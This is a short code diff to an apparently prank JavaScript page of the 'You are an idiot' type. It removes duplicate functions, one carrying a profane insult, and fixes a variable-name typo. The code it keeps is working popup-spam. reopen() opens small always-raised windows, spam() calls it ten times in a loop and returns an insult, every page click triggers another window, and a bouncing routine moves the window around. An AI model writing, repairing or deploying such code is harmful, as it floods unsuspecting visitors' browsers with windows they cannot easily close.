@@ -8,23 +8,11 @@ function reopen() {
     "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
 }
-function reopen() {
-  window.open(
-    "dafjkhaskl.html",
-    "",
-    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
-  );
-}
 function spam() {
   for (var i = 0; i < 10; i++) {
     reopen();
   }
   return "You are an idiot!";
-}function spam() {
-  for (var i = 0; i < 10; i++) {
-    reopen();
-  }
-  return "You are an Idiot motherfucker!!!! !";
 }
 function init() {
   document.body.onclick = reopen;
@@ -60,7 +48,7 @@ function newYdn() {
   yOff = Math.ceil(7 * Math.random()) * 5 - 10;
 }
 function fOff() {
-  flagrun = false;
+  flagRun = false;
 }
 function playBall() {
   xPos += xOff;
